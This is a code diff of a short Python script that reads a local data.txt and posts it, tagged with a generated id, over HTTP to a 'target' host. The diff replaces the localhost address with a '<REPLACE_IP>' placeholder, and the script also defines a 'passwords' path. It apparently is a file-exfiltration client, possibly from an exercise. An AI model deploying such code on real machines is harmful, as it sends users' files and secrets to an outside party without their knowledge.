@@ -1,4 +1,3 @@
-#!/bin/python3
 import socket
 import hashlib
 import os
@@ -7,11 +6,12 @@ from subprocess import Popen, PIPE, STDOUT
 from base64 import b64encode
 
 # target address
-target_ip = "127.0.0.1"
+target_ip = "<REPLACE_IP>"
 target_port = 10000
 target_passwd_path = "passwords"
 
-
+# get current pwd
+current_dir = os.getcwd()
 
 def send_data(raw_data, unique_id, path, kind):
     url = f"http://{target_ip}:{target_port}/{path}"
@@ -33,13 +33,12 @@ def generate_uuid():
     unique_id = hash_object.hexdigest()
     return unique_id
 
-# get current pwd
-current_dir = os.getcwd()
+
 
 # generate uuid
 unique_id = generate_uuid()
 
-with open("data.txt", "r") as f:
+with open(f"{current_dir}/data.txt", "r") as f:
     data = f.read()
 
 
